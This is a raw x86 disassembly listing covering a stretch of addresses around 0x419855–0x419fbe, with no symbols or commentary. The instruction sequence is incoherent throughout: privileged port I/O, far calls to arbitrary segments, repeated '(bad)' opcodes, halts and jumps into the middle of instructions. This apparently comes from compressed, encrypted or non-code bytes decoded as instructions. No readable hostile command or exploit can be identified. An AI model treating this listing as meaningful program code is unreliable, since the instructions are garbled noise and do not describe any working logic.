  419855:	scas   eax,DWORD PTR es:[edi]
  419856:	arpl   WORD PTR [edx+ebx*1-0x7c],dx
  41985a:	lods   eax,DWORD PTR ds:[esi]
  41985b:	cmp    esp,ebp
  41985d:	cmp    bh,BYTE PTR [ecx]
  41985f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419860:	js     0x419871
  419862:	js     0x4198a4
  419864:	fwait
  419865:	jmp    esp
  419867:	and    edx,DWORD PTR [edx-0x73722844]
  41986d:	call   0x1dea:0xccf854a2
  419874:	add    BYTE PTR [ebp+0x41],dl
  419877:	es test eax,0xeb4cbf36
  41987d:	inc    ecx
  41987e:	sub    al,0x66
  419880:	scas   eax,DWORD PTR es:[edi]
  419881:	jbe    0x419883
  419883:	sub    eax,esp
  419885:	push   eax
  419886:	cmc    
  419887:	lock push ecx
  419889:	rcl    DWORD PTR [edi+0x1b],0x2e
  41988d:	mov    WORD PTR es:[edx],fs
  419890:	lods   eax,DWORD PTR ds:[esi]
  419891:	sti    
  419892:	sub    ebp,DWORD PTR [eax]
  419894:	cmp    BYTE PTR [ecx+ecx*8-0x68],bl
  419898:	dec    ebx
  419899:	add    DWORD PTR [ebx],ebx
  41989b:	mov    WORD PTR [edi+0x2ec78794],fs
  4198a1:	icebp  
  4198a2:	loope  0x419850
  4198a4:	aam    0xb2
  4198a6:	imul   eax,ebx,0xd2e68827
  4198ac:	test   DWORD PTR [esi],ecx
  4198ae:	hlt    
  4198af:	pusha  
  4198b0:	mul    DWORD PTR [bx+si]
  4198b3:	sub    DWORD PTR [edi+0x78],eax
  4198b6:	sbb    BYTE PTR [edi],al
  4198b8:	bound  eax,QWORD PTR [ebx+ecx*2+0x5e]
  4198bc:	cwde   
  4198bd:	xor    BYTE PTR [edi],bh
  4198bf:	loop   0x419862
  4198c1:	test   eax,0xcfc7e6ce
  4198c6:	shr    DWORD PTR [ecx],cl
  4198c8:	es pop ebp
  4198ca:	call   0x745b06c3
  4198cf:	loope  0x41991c
  4198d1:	pop    esp
  4198d2:	mov    dl,0xd7
  4198d4:	std    
  4198d5:	push   ebx
  4198d6:	xor    ax,WORD PTR [esi+ecx*4]
  4198da:	pop    esp
  4198db:	mov    bh,0x68
  4198dd:	mov    al,ds:0xc2cfdea1
  4198e2:	cmc    
  4198e3:	mov    al,0x1d
  4198e5:	push   0xffffffcc
  4198e7:	pop    ss
  4198e8:	mov    edx,edx
  4198ea:	out    dx,eax
  4198eb:	sub    al,0xef
  4198ed:	imul   edx,DWORD PTR [ebp+0x79e92034],0x18
  4198f4:	or     cl,0xdc
  4198f7:	or     DWORD PTR [edi-0xb],esi
  4198fa:	jl     0x419944
  4198fc:	push   0x27
  4198fe:	pop    esi
  4198ff:	aas    
  419900:	xchg   ebx,eax
  419901:	ja     0x419941
  419903:	push   edx
  419904:	xchg   edx,eax
  419905:	push   ecx
  419906:	jge    0x419898
  419908:	push   ds
  419909:	jne    0x41989c
  41990b:	and    ah,BYTE PTR [eax-0x4d]
  41990e:	inc    ebp
  41990f:	adc    BYTE PTR [ebp+0x25892a15],dh
  419915:	into   
  419916:	out    dx,eax
  419917:	sub    DWORD PTR [edi-0x2f],edx
  41991a:	jnp    0x419943
  41991c:	sub    bl,BYTE PTR [edx-0x50daa6b1]
  419922:	repz lea ecx,[ebx+0x43]
  419926:	push   0xffffffa9
  419928:	mov    esp,0xf0ce24ed
  41992d:	popf   
  41992e:	or     al,0xa4
  419930:	fsubr  DWORD PTR [eax]
  419932:	fst    QWORD PTR [edx]
  419934:	stos   DWORD PTR es:[edi],eax
  419935:	mov    ah,0x15
  419937:	cs clc 
  419939:	scas   al,BYTE PTR es:[edi]
  41993a:	sti    
  41993b:	cdq    
  41993c:	sub    dl,dl
  41993e:	lock inc edx
  419940:	cld    
  419941:	mov    ebx,0x6422955d
  419946:	xor    DWORD PTR [ecx+0x22],eax
  419949:	in     al,0xa1
  41994b:	sbb    eax,0x771fc9de
  419950:	cmp    BYTE PTR [eax],0x2f
  419953:	jmp    0x7927:0xe6bea8c5
  41995a:	mov    ch,0xd6
  41995c:	jns    0x41993e
  41995e:	mov    al,ds:0xa664cd1e
  419963:	push   ebp
  419964:	pop    ss
  419965:	xchg   DWORD PTR [ebx+0x5c],ecx
  419968:	adc    BYTE PTR [edi],cl
  41996a:	mov    bl,0xd9
  41996c:	xor    al,0x89
  41996e:	dec    edx
  41996f:	jg     0x41993d
  419971:	enter  0x5863,0x8e
  419975:	fimul  DWORD PTR [ecx]
  419977:	and    eax,0xdef5e9e3
  41997c:	icebp  
  41997d:	out    dx,eax
  41997e:	and    eax,0x45b46e6e
  419983:	and    al,0xcf
  419985:	push   esi
  419986:	add    dl,dh
  419988:	inc    ebx
  419989:	arpl   WORD PTR [ecx+0xd],sp
  41998c:	lds    ebp,FWORD PTR [ecx]
  41998e:	cmp    DWORD PTR [ecx+0xe],0x914e20da
  419995:	adc    eax,0x51e672d
  41999a:	mov    edx,0x52f01745
  41999f:	jb     0x419941
  4199a1:	and    ebx,0xffffffff
  4199a4:	in     al,0x7b
  4199a6:	mov    dh,0xb2
  4199a8:	dec    esp
  4199a9:	jl     0x4199d3
  4199ab:	lock ror ecx,cl
  4199ae:	outs   dx,BYTE PTR ds:[esi]
  4199af:	leave  
  4199b0:	cmp    DWORD PTR cs:[ebp-0x760be676],0xd43225dc
  4199bb:	xchg   edx,eax
  4199bc:	pop    ebp
  4199bd:	das    
  4199be:	mov    DWORD PTR [ebp+eax*1+0x61],esi
  4199c2:	push   esp
  4199c3:	call   0xffc8f3ff
  4199c8:	inc    ebx
  4199c9:	(bad)  
  4199cb:	jge    0x419a43
  4199cd:	jno    0x419983
  4199cf:	jns    0x41997c
  4199d1:	adc    al,0x52
  4199d3:	mov    ch,0x16
  4199d5:	shl    dl,0xe4
  4199d8:	mov    ah,0xcb
  4199da:	pop    ebp
  4199db:	ja     0x419a1d
  4199dd:	xchg   BYTE PTR [edx-0xe],ch
  4199e0:	call   0xd311:0x8523fb7c
  4199e7:	in     eax,dx
  4199e8:	mov    ebx,0x8cde2625
  4199ed:	mov    al,0x81
  4199ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199f0:	test   BYTE PTR ds:0x52bf1acd,ch
  4199f6:	jp     0x419a53
  4199f8:	inc    esi
  4199f9:	inc    edi
  4199fa:	sar    BYTE PTR [esi-0x21bfba93],0x4e
  419a01:	in     eax,dx
  419a02:	cmp    al,0x96
  419a04:	fstp   TBYTE PTR [edx]
  419a06:	shr    DWORD PTR [ebx-0x11],0x5e
  419a0a:	leave  
  419a0b:	popa   
  419a0c:	add    bh,BYTE PTR [edi+0x71]
  419a0f:	das    
  419a10:	cwde   
  419a11:	js     0x4199aa
  419a13:	and    DWORD PTR [ebx-0xa],ebx
  419a16:	or     ch,BYTE PTR [eax+0x35cdf8c7]
  419a1c:	sbb    eax,0xcf6f9269
  419a21:	outs   dx,DWORD PTR gs:[esi]
  419a23:	dec    ecx
  419a24:	outs   dx,DWORD PTR ds:[esi]
  419a25:	xchg   esi,eax
  419a26:	sahf   
  419a27:	or     dh,BYTE PTR [esi+0x58]
  419a2a:	out    dx,al
  419a2b:	xor    BYTE PTR [edi+0x4028214c],ah
  419a31:	mov    fs:0xfda780aa,eax
  419a37:	in     al,dx
  419a38:	cdq    
  419a39:	xchg   DWORD PTR [ebx-0x51],edx
  419a3c:	mov    dl,0x5a
  419a3e:	nop
  419a3f:	xchg   ch,dh
  419a41:	mov    ch,0x35
  419a43:	push   0x28a293dc
  419a48:	imul   esp,DWORD PTR [eax],0xb900374e
  419a4e:	jo     0x419a51
  419a50:	lahf   
  419a51:	out    0xc9,al
  419a53:	push   DWORD PTR [ecx-0x6996d8ec]
  419a59:	popf   
  419a5a:	dec    ebp
  419a5b:	clc    
  419a5c:	fs or  edx,edx
  419a5f:	clc    
  419a60:	test   eax,0x23f6f70b
  419a65:	xchg   esp,eax
  419a66:	(bad)  
  419a67:	xor    BYTE PTR [edi],al
  419a69:	xchg   ecx,eax
  419a6a:	dec    edx
  419a6b:	or     bl,BYTE PTR [ebx+eiz*1]
  419a6e:	rol    BYTE PTR [ebp-0x674e9ffb],1
  419a74:	pop    ebp
  419a75:	xchg   ebp,eax
  419a76:	push   0x6bf8eaae
  419a7b:	sub    al,0x82
  419a7d:	push   ebx
  419a7e:	or     al,0xca
  419a80:	mov    al,0x6c
  419a82:	dec    edi
  419a83:	(bad)  
  419a84:	aad    0xed
  419a86:	or     ebx,esi
  419a88:	pop    esp
  419a89:	sbb    eax,0xa79de639
  419a8e:	adc    BYTE PTR [ebx+0x208d541a],ch
  419a94:	cld    
  419a95:	pop    ebx
  419a96:	mov    ds,WORD PTR es:[edx+0x14]
  419a9a:	add    al,bl
  419a9c:	xchg   esi,eax
  419a9d:	xor    ch,dl
  419a9f:	pop    eax
  419aa0:	pop    esi
  419aa1:	mov    eax,0x63491911
  419aa6:	inc    eax
  419aa7:	or     ch,BYTE PTR [edi-0x44]
  419aaa:	xchg   ebx,eax
  419aab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419aac:	pop    ebp
  419aad:	jnp    0x419a96
  419aaf:	sub    al,ah
  419ab1:	inc    ebx
  419ab2:	add    edi,DWORD PTR es:[eax-0x14964974]
  419ab9:	push   esp
  419aba:	pusha  
  419abb:	and    BYTE PTR [esi+ebp*4-0x256ab07f],0xc6
  419ac3:	push   ebp
  419ac4:	sub    eax,0x5dbdbdde
  419ac9:	mov    WORD PTR [ecx],es
  419acb:	and    BYTE PTR [ebx-0x4a],dl
  419ace:	xchg   BYTE PTR ds:0xb4396c87,bh
  419ad4:	scas   eax,DWORD PTR es:[edi]
  419ad5:	adc    eax,DWORD PTR [ebx]
  419ad7:	sar    DWORD PTR [eax+edi*2],1
  419ada:	push   eax
  419adb:	rcr    BYTE PTR [eax+eax*8],cl
  419ade:	mov    ebp,0xb7a33d96
  419ae3:	ds cdq 
  419ae5:	cmp    al,0x9
  419ae7:	aad    0xe2
  419ae9:	fcom   DWORD PTR [eax+0x3c]
  419aec:	fadd   DWORD PTR [esi+ebx*1-0xffd9cc8]
  419af3:	jecxz  0x419b27
  419af5:	(bad)  
  419af7:	cli    
  419af8:	jg     0x419b33
  419afa:	int    0xca
  419afc:	es (bad) 
  419afe:	adc    DWORD PTR [eax],ebx
  419b00:	(bad)  
  419b01:	iret   
  419b02:	test   esp,edx
  419b04:	mov    ah,0x4f
  419b06:	sub    eax,0x262828a1
  419b0b:	mov    ds:0x72cdd57f,eax
  419b10:	daa    
  419b11:	inc    ebx
  419b12:	push   edi
  419b13:	scas   al,BYTE PTR es:[edi]
  419b14:	iret   
  419b15:	jmp    0x419b87
  419b17:	inc    edi
  419b18:	xchg   esp,ebx
  419b1a:	xor    DWORD PTR [eax],ecx
  419b1c:	mov    edx,0x73543b31
  419b21:	aas    
  419b22:	aas    
  419b23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b24:	mov    eax,0xbc08cbd9
  419b29:	add    bh,BYTE PTR [edx+0x79]
  419b2c:	push   cs
  419b2d:	add    eax,0x8a1c052a
  419b32:	sbb    DWORD PTR [edx-0x3b08667d],esi
  419b38:	mov    eax,ds:0xd96e0ad2
  419b3d:	addr16 das 
  419b3f:	xchg   DWORD PTR [esi+0x2d85c9ac],esi
  419b45:	sbb    bh,BYTE PTR [ecx]
  419b47:	in     al,dx
  419b48:	push   ecx
  419b49:	icebp  
  419b4a:	sbb    ecx,DWORD PTR [ebp+0xe]
  419b4d:	js     0x419b3a
  419b4f:	sbb    al,ah
  419b51:	in     al,dx
  419b52:	(bad)  
  419b53:	clc    
  419b54:	mov    ah,0x47
  419b56:	outs   dx,DWORD PTR ds:[esi]
  419b57:	ds jp  0x419b64
  419b5a:	lods   al,BYTE PTR ds:[esi]
  419b5b:	jns    0x419afe
  419b5d:	call   0x978:0x4aaceac3
  419b64:	adc    al,0xfd
  419b66:	xor    ebp,DWORD PTR [esi+0x4c]
  419b69:	xchg   edx,eax
  419b6a:	call   0xcac0c11b
  419b6f:	test   edx,esp
  419b71:	push   ebx
  419b72:	dec    edi
  419b73:	add    BYTE PTR [ebx+0x1c1d8402],dl
  419b79:	pusha  
  419b7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b7b:	nop
  419b7c:	cli    
  419b7d:	out    dx,al
  419b7e:	cmc    
  419b7f:	lods   al,BYTE PTR ds:[esi]
  419b80:	loop   0x419b64
  419b82:	test   BYTE PTR [ecx-0x3dc3bd55],bl
  419b88:	mov    al,ds:0xe66f3e80
  419b8d:	add    al,0xa6
  419b8f:	fs out 0xe,al
  419b92:	dec    eax
  419b93:	loope  0x419ba6
  419b95:	je     0x419b91
  419b97:	gs ret 
  419b99:	jge    0x419b35
  419b9b:	jnp    0x419c07
  419b9d:	pop    eax
  419b9e:	dec    edx
  419b9f:	xchg   ebx,eax
  419ba0:	repz (bad) 
  419ba2:	dec    esp
  419ba3:	icebp  
  419ba4:	cwde   
  419ba5:	add    ecx,0x50
  419ba8:	int3   
  419ba9:	xor    bh,BYTE PTR [eax]
  419bab:	or     DWORD PTR [ecx+0x63],ebp
  419bae:	fs sbb eax,0xe7347226
  419bb4:	imul   ebx,DWORD PTR [ebx+0x15],0xffffffe0
  419bb8:	mov    ch,0x74
  419bba:	loop   0x419c0b
  419bbc:	and    edi,DWORD PTR [ebx]
  419bbe:	mov    ah,0x7e
  419bc0:	mov    dh,BYTE PTR [edi]
  419bc2:	jecxz  0x419bc1
  419bc4:	ss call 0x5a7790de
  419bca:	in     al,0xc9
  419bcc:	cwde   
  419bcd:	fnsave [edi]
  419bcf:	mov    bl,0xfe
  419bd1:	lock xor DWORD PTR [ecx-0x10],esp
  419bd5:	push   0x86f69832
  419bda:	sbb    DWORD PTR [edi+0x3338eb5e],edi
  419be0:	ret    
  419be1:	lods   al,BYTE PTR ds:[esi]
  419be2:	sti    
  419be3:	out    dx,eax
  419be4:	dec    eax
  419be5:	xor    al,0xa0
  419be7:	jp     0x419b83
  419be9:	sbb    ebp,ebx
  419beb:	and    ebx,DWORD PTR [ebp+0x2f]
  419bee:	loopne 0x419c58
  419bf0:	and    ebx,edx
  419bf2:	pop    ds
  419bf3:	xchg   esp,eax
  419bf4:	retf   
  419bf5:	push   ebx
  419bf6:	stos   BYTE PTR es:[edi],al
  419bf7:	fld    QWORD PTR [edi-0x374e01b3]
  419bfd:	adc    eax,0x7f5f081f
  419c02:	or     ebp,DWORD PTR [esp+ecx*2]
  419c05:	aam    0xb7
  419c07:	sbb    BYTE PTR [ecx],0xa1
  419c0a:	loop   0x419ba7
  419c0c:	xchg   DWORD PTR [ebx],ecx
  419c0e:	popf   
  419c0f:	in     eax,dx
  419c10:	or     BYTE PTR [esi-0x17],bl
  419c13:	dec    edi
  419c14:	pop    ebx
  419c15:	popf   
  419c16:	lea    ecx,[edx-0x1e]
  419c19:	out    0xcd,eax
  419c1b:	cdq    
  419c1c:	jnp    0x419c6a
  419c1e:	push   cs
  419c1f:	stos   DWORD PTR es:[edi],eax
  419c20:	fs mov ah,bh
  419c23:	or     BYTE PTR [esi-0x5df22e27],ah
  419c29:	mov    edi,DWORD PTR [edx]
  419c2b:	or     eax,0xcfea00be
  419c30:	fiadd  WORD PTR [edx+0x6dc49a70]
  419c36:	(bad)  
  419c37:	icebp  
  419c38:	sbb    BYTE PTR [edi-0x72e109ee],ah
  419c3e:	sub    dl,BYTE PTR [ecx+0x7b0dba22]
  419c44:	icebp  
  419c45:	push   esi
  419c46:	xchg   ebp,eax
  419c47:	mov    edx,0xec6d9059
  419c4c:	ins    BYTE PTR es:[edi],dx
  419c4d:	and    bh,0x94
  419c50:	inc    eax
  419c51:	icebp  
  419c52:	add    bl,bh
  419c54:	xchg   ecx,eax
  419c55:	int3   
  419c56:	xlat   BYTE PTR ds:[ebx]
  419c57:	sbb    DWORD PTR [eax+0x71f1d066],esi
  419c5d:	gs (bad) 
  419c60:	outs   dx,BYTE PTR ds:[esi]
  419c61:	xor    BYTE PTR [edi-0x76f33afa],bl
  419c67:	aad    0xa5
  419c69:	xchg   ebx,eax
  419c6a:	sub    BYTE PTR [esi],cl
  419c6c:	les    ebx,FWORD PTR [ebp-0xecc6a85]
  419c72:	push   eax
  419c73:	jle    0x419c57
  419c75:	repnz mov cl,0x1f
  419c78:	sub    DWORD PTR [esi-0x214cac18],esp
  419c7e:	aam    0x98
  419c80:	adc    BYTE PTR [edx+ebx*1+0x3a],cl
  419c84:	jno    0x419cd5
  419c86:	sti    
  419c87:	sub    dl,BYTE PTR [edi-0x17]
  419c8a:	lahf   
  419c8b:	xchg   esi,eax
  419c8c:	mov    ch,0x1d
  419c8e:	jno    0x419ce3
  419c90:	call   0xa6151ac5
  419c95:	sub    esi,DWORD PTR ss:[ebx-0x4864d5e5]
  419c9c:	stos   DWORD PTR es:[edi],eax
  419c9d:	daa    
  419c9e:	(bad)  
  419c9f:	(bad)  
  419ca0:	sub    ecx,eax
  419ca2:	inc    ecx
  419ca3:	sbb    eax,0xcb5db05f
  419ca8:	cwde   
  419ca9:	add    edi,DWORD PTR [ebx+0x3d]
  419cac:	dec    edi
  419cad:	in     eax,0xf1
  419caf:	dec    ecx
  419cb0:	fcomp  DWORD PTR [eax]
  419cb2:	push   eax
  419cb3:	xchg   BYTE PTR fs:[esi],cl
  419cb6:	mov    al,ds:0x8fa22f85
  419cbb:	out    0x87,al
  419cbd:	mov    bh,0x89
  419cbf:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  419cc1:	cmp    al,0xfd
  419cc3:	jge    0x419cbf
  419cc5:	inc    edx
  419cc6:	jmp    0x419c8b
  419cc8:	test   BYTE PTR [edi+ecx*1+0x3b],0x70
  419ccd:	sub    DWORD PTR [esi],ecx
  419ccf:	fmul   QWORD PTR [ebx]
  419cd1:	dec    ebp
  419cd2:	mov    cl,cl
  419cd4:	mov    ch,0x94
  419cd6:	xchg   ecx,eax
  419cd7:	fild   QWORD PTR [edx+0x44]
  419cda:	mov    eax,0x1d28ea09
  419cdf:	and    DWORD PTR [edi],eax
  419ce1:	dec    ebp
  419ce2:	ins    DWORD PTR es:[edi],dx
  419ce3:	lds    esp,FWORD PTR [eax+0x350e5ab5]
  419ce9:	push   esp
  419cea:	xchg   DWORD PTR [ebx-0x60],ebp
  419ced:	fst    DWORD PTR [ecx]
  419cef:	and    eax,0x53235f76
  419cf4:	mov    ebp,0x13807b5e
  419cf9:	mul    esp
  419cfb:	jne    0x419c86
  419cfd:	jne    0x419cf5
  419cff:	in     eax,dx
  419d00:	ds iret 
  419d02:	jo     0x419cc8
  419d04:	mov    ebp,0x9d2f5a35
  419d09:	push   0xffffffdb
  419d0b:	mov    ch,0xda
  419d0d:	in     eax,dx
  419d0e:	or     eax,0x91fc44b4
  419d13:	fs pop es
  419d15:	add    cl,bh
  419d17:	mov    bh,0x7f
  419d19:	fmul   DWORD PTR [eax+0x57eb1d1]
  419d1f:	(bad)  
  419d20:	popa   
  419d21:	lods   al,BYTE PTR ds:[esi]
  419d22:	rcl    DWORD PTR [esi-0x71],1
  419d25:	in     al,dx
  419d26:	ins    DWORD PTR es:[edi],dx
  419d27:	data16 rcl bh,cl
  419d2a:	pop    ebp
  419d2b:	gs pop es
  419d2d:	jecxz  0x419da3
  419d2f:	hlt    
  419d30:	dec    esi
  419d31:	mov    cl,0x4d
  419d33:	adc    DWORD PTR [esi-0x5692a649],ebp
  419d39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d3a:	sbb    bl,bh
  419d3c:	and    al,al
  419d3e:	add    al,0x11
  419d40:	dec    edx
  419d41:	in     eax,0xc7
  419d43:	pusha  
  419d44:	in     eax,0xed
  419d46:	cli    
  419d47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d48:	pop    ebp
  419d49:	xlat   BYTE PTR ds:[ebx]
  419d4a:	adc    al,0x96
  419d4c:	aad    0x80
  419d4e:	fwait
  419d4f:	jg     0x419ce1
  419d51:	mov    bh,BYTE PTR [ecx]
  419d53:	and    al,0x88
  419d55:	mov    ah,0x48
  419d57:	pop    ebx
  419d58:	push   ebx
  419d59:	xchg   esp,eax
  419d5a:	mov    cl,0xd5
  419d5c:	add    edi,ecx
  419d5e:	das    
  419d5f:	jp     0x419cf7
  419d61:	lock dec ecx
  419d63:	test   DWORD PTR [ebx],0x8cbd60e0
  419d69:	lock xchg DWORD PTR [ebx+0x78],ebx
  419d6d:	fisttp WORD PTR [ecx]
  419d70:	jns    0x419db2
  419d72:	lds    edi,FWORD PTR [eax+0x1]
  419d75:	div    BYTE PTR [ebx]
  419d77:	retf   0xecb9
  419d7a:	scas   eax,DWORD PTR es:[edi]
  419d7b:	sub    ebx,edi
  419d7d:	push   ecx
  419d7e:	in     eax,dx
  419d7f:	push   esp
  419d80:	push   0x396e5957
  419d85:	sub    ah,ah
  419d87:	rcr    DWORD PTR [eax+0x76],1
  419d8a:	xchg   ebp,eax
  419d8b:	add    DWORD PTR [ebx],0x5d
  419d8e:	jge    0x419dde
  419d90:	ret    0x67b3
  419d93:	pop    esp
  419d94:	call   0x56bfdbd6
  419d99:	mov    edi,0xcd180199
  419d9e:	cmp    eax,0x6cbbf3fd
  419da3:	adc    esp,DWORD PTR [eax+0x506ab8ad]
  419da9:	dec    edi
  419daa:	cmp    al,0x31
  419dac:	sub    esi,DWORD PTR [esi]
  419dae:	and    eax,0xe1baad11
  419db3:	inc    esi
  419db4:	aas    
  419db5:	and    dl,ah
  419db7:	bound  ecx,QWORD PTR [edx]
  419db9:	sar    DWORD PTR [edi+0x6540a957],0xb3
  419dc0:	push   ebx
  419dc1:	pop    esp
  419dc2:	push   esp
  419dc4:	loop   0x419df6
  419dc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dc7:	(bad)  
  419dc8:	stc    
  419dc9:	xor    BYTE PTR [edx],bl
  419dcb:	mov    cl,0x2c
  419dcd:	jnp    0x419e19
  419dcf:	test   DWORD PTR [eax],ebp
  419dd1:	es cld 
  419dd3:	push   cs
  419dd4:	rol    BYTE PTR [edi+0x3e],0xd6
  419dd8:	addr16 pusha 
  419dda:	cwde   
  419ddb:	jne    0x419df5
  419ddd:	addr16 sub al,0xa6
  419de0:	lahf   
  419de1:	pusha  
  419de2:	add    BYTE PTR [ecx],ch
  419de4:	or     bh,bh
  419de6:	push   esp
  419de7:	fwait
  419de8:	(bad)  
  419de9:	mov    WORD PTR [ebx+edx*1+0x16],ds
  419ded:	js     0x419e5a
  419def:	dec    eax
  419df0:	inc    esi
  419df1:	out    dx,al
  419df2:	jg     0x419df4
  419df4:	xchg   esp,ebx
  419df6:	mov    ds:0xbdf2b8a1,al
  419dfb:	xchg   ecx,eax
  419dfc:	mov    ch,0x87
  419dfe:	les    eax,FWORD PTR [edi+0xe]
  419e01:	mov    eax,0xcdef7120
  419e06:	call   esi
  419e08:	mov    dh,0xe7
  419e0a:	mov    al,ds:0xcd9ec612
  419e0f:	adc    ebx,edx
  419e11:	dec    eax
  419e12:	cmp    esi,DWORD PTR [ebx+0x4747ffc7]
  419e18:	dec    ebx
  419e19:	and    BYTE PTR [ecx+edi*4-0x17],ah
  419e1d:	out    0x47,eax
  419e1f:	cmp    eax,0x6a0fad79
  419e24:	lds    edi,FWORD PTR [ebx-0x59db344c]
  419e2a:	jnp    0x419e28
  419e2c:	ficom  WORD PTR [esi]
  419e2e:	xchg   esp,eax
  419e2f:	add    eax,0xdffe33da
  419e34:	pushf  
  419e35:	and    dh,BYTE PTR [esi-0x3a]
  419e38:	jmp    0x419e58
  419e3a:	test   BYTE PTR [esi+0x47961942],0xc8
  419e41:	out    0x8f,al
  419e43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e44:	sub    BYTE PTR [ecx],dl
  419e46:	push   ebx
  419e47:	sbb    eax,edi
  419e49:	sub    DWORD PTR [ebx-0x2224f63a],ecx
  419e4f:	jnp    0x419dfc
  419e51:	sahf   
  419e52:	pop    ebp
  419e53:	jg     0x419dfe
  419e55:	shl    BYTE PTR [edi+0x77],0x6
  419e59:	xor    ebx,edx
  419e5b:	cmp    cl,BYTE PTR ds:0x80e94831
  419e61:	add    ah,BYTE PTR [ecx-0x9c588d]
  419e67:	sbb    cl,al
  419e69:	push   esi
  419e6a:	loopne 0x419ec8
  419e6c:	cs mov ebx,0x43077566
  419e72:	ret    0xc382
  419e75:	aad    0x1d
  419e77:	imul   di,WORD PTR [edi+0x15ea6a7],0xffc1
  419e7f:	dec    edx
  419e80:	push   ebp
  419e81:	(bad)  
  419e82:	push   ss
  419e83:	mov    eax,ds:0x78b8ea40
  419e88:	jnp    0x419e64
  419e8a:	mov    edi,0x589a5ba4
  419e8f:	imul   esp,DWORD PTR [ecx+0x48],0xffffff86
  419e93:	jns    0x419e69
  419e95:	loop   0x419e49
  419e97:	mov    edi,DWORD PTR [ecx+0x1]
  419e9a:	movups XMMWORD PTR [edx],xmm1
  419e9d:	push   cs
  419e9e:	dec    esp
  419e9f:	xor    eax,0xf09d7565
  419ea4:	in     eax,dx
  419ea5:	ret    
  419ea6:	adc    ecx,DWORD PTR [esi+0x70]
  419ea9:	sbb    DWORD PTR [eax+0xf8a329c],0xffffffb1
  419eb0:	into   
  419eb1:	and    al,0x8f
  419eb3:	in     eax,dx
  419eb4:	rcl    BYTE PTR [edi+0xa],cl
  419eb7:	lock pop edi
  419eb9:	or     ah,dh
  419ebb:	dec    esi
  419ebc:	and    DWORD PTR [eax],0x5e
  419ebf:	jnp    0x419eec
  419ec1:	int3   
  419ec2:	fistp  DWORD PTR [edi-0x6b]
  419ec5:	(bad)  
  419ec6:	pop    ds
  419ec7:	mov    dx,0xcb1a
  419ecb:	loope  0x419ee7
  419ecd:	pop    es
  419ece:	imul   ecx,edi,0xbc50b418
  419ed4:	ds icebp 
  419ed6:	jl     0x419f39
  419ed8:	enter  0xdaf,0x2e
  419edc:	dec    esi
  419edd:	inc    esi
  419ede:	jo     0x419e7d
  419ee0:	push   esp
  419ee1:	les    ebp,FWORD PTR [esp+eax*2-0x7a]
  419ee5:	cmp    BYTE PTR [edx+ebp*1],ah
  419ee8:	das    
  419ee9:	repnz pushf 
  419eeb:	data16 adc al,0x2d
  419eee:	or     bl,0xfa
  419ef1:	push   edx
  419ef2:	mov    al,0x39
  419ef4:	mov    dl,0x44
  419ef6:	mov    cl,0x3a
  419ef8:	jb     0x419ee8
  419efa:	loopne 0x419f43
  419efc:	jbe    0x419f0b
  419efe:	fidivr DWORD PTR [edi-0x74]
  419f01:	call   0xdbcb:0xf43fffa7
  419f08:	into   
  419f09:	retf   
  419f0a:	pop    ds
  419f0b:	add    edi,DWORD PTR [esi]
  419f0d:	fldcw  WORD PTR [edi+0x15737114]
  419f13:	(bad)  
  419f14:	(bad)  
  419f15:	adc    DWORD PTR [esi],edi
  419f17:	into   
  419f18:	aaa    
  419f19:	fldenv [esi+0x559bcecc]
  419f1f:	cli    
  419f20:	or     eax,DWORD PTR [esi+0x9]
  419f23:	jae    0x419ed4
  419f25:	mov    ah,0xc8
  419f27:	into   
  419f28:	add    DWORD PTR [eax],edx
  419f2a:	xchg   ebp,eax
  419f2b:	pop    esi
  419f2c:	iret   
  419f2d:	sbb    esi,DWORD PTR [edx+0x6bab48e6]
  419f33:	das    
  419f34:	adc    esi,edi
  419f36:	bound  ebx,QWORD PTR cs:[esi-0x70]
  419f3a:	data16 aam 0x3a
  419f3d:	inc    esi
  419f3e:	cmp    eax,0xc6e84a24
  419f43:	dec    edx
  419f44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f45:	xor    bl,al
  419f47:	xlat   BYTE PTR ds:[ebx]
  419f48:	sahf   
  419f49:	mov    bl,0x6e
  419f4b:	outs   dx,BYTE PTR ds:[esi]
  419f4c:	ret    
  419f4d:	pushf  
  419f4e:	add    BYTE PTR [edi-0x24],0xbe
  419f52:	xor    BYTE PTR [edi],0xe5
  419f55:	js     0x419f32
  419f57:	std    
  419f58:	mov    BYTE PTR [ebp+0x46],bh
  419f5b:	ins    BYTE PTR es:[edi],dx
  419f5c:	aaa    
  419f5d:	add    bl,0xa0
  419f60:	rcl    DWORD PTR ds:0xc8904801,1
  419f66:	aas    
  419f67:	sub    al,0x82
  419f69:	maskmovq mm0,(bad)
  419f6a:	test   DWORD PTR [ebp+edx*8+0x4c6f5606],0x3419983d
  419f75:	jno    0x419fdb
  419f77:	out    0xb2,al
  419f79:	jb     0x419f5c
  419f7b:	scas   al,BYTE PTR es:[edi]
  419f7c:	out    0x27,eax
  419f7e:	sbb    esp,DWORD PTR [ebp+0x5c5c3629]
  419f84:	fs ret 0xf76e
  419f88:	scas   eax,DWORD PTR es:[edi]
  419f89:	cmc    
  419f8a:	jmp    0x48428f90
  419f8f:	aaa    
  419f90:	outs   dx,DWORD PTR ds:[esi]
  419f91:	inc    edi
  419f92:	inc    ebx
  419f93:	cmp    ecx,edx
  419f95:	cmp    BYTE PTR [ebx+0x2bafadb],0xd6
  419f9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f9d:	jl     0x419f21
  419f9f:	jp     0x419fac
  419fa1:	cld    
  419fa2:	xor    BYTE PTR [esi],bl
  419fa4:	imul   ebp,DWORD PTR [eax-0x538bc2c0],0x3c
  419fab:	sahf   
  419fac:	ret    0x8a82
  419faf:	jbe    0x41a016
  419fb1:	gs or  al,0xc2
  419fb4:	pop    ecx
  419fb5:	pusha  
  419fb6:	clc    
  419fb7:	pop    edi
  419fb8:	dec    ecx
  419fb9:	hlt    
  419fba:	loop   0x41a001
  419fbc:	xor    DWORD PTR [eax],esp
  419fbe:	loope  0x419ffb
